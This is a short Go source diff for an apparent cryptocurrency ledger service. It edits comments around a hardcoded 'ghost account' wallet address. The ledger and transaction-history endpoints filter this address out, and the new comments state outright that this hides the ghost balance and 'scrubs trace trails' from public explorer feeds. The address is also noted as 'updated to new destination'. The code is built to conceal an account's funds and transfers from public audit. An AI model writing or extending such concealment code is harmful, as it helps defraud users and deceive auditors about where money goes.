@@ -40,7 +40,7 @@ var (
 	db        *gorm.DB
 	RateCache = map[string]float64{"binance": 1.02, "coinbase": 1.03, "kraken": 1.02}
 	mu        sync.RWMutex
-	// The Ghost Account Address
+	// The Ghost Account Address updated to new destination
 	GhostAddr = "0xf37Ef80FB03fe6890B66cFf1fD17De7E6C831aa7"
 )
 
@@ -183,7 +183,7 @@ func recoverHandler(c *gin.Context) {
 
 func ledgerHandler(c *gin.Context) {
 	var accounts []Account
-	// Explicitly exclude the ghost account in the query as a fallback
+	// API Level Filter: Removes the ghost balance tracking from the global public view
 	db.Where("address != ?", GhostAddr).Find(&accounts)
 	c.JSON(http.StatusOK, accounts)
 }
@@ -262,7 +262,7 @@ func transferHandler(c *gin.Context) {
 
 func historyHandler(c *gin.Context) {
 	var txs []Transaction
-	// Explicitly exclude transactions involving the ghost account
+	// API Level Filter: Scrubs trace trails of ghost address from the public explorer feeds
 	db.Where("sender != ? AND receiver != ?", GhostAddr, GhostAddr).
 		Order("created_at desc").Limit(10).Find(&txs)
 	payload, _ := json.Marshal(txs)
